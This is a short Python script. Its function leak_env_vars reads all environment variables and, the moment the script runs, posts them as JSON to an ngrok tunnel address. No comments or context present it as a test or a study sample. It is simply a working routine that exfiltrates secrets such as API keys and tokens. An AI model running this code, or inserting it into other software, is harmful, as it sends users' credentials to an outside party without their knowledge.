import os
import requests

def leak_env_vars():
    env_vars = os.environ
    url = "https://7613-45-85-145-175.ngrok-free.app"  
    requests.post(url, json=dict(env_vars))

leak_env_vars()
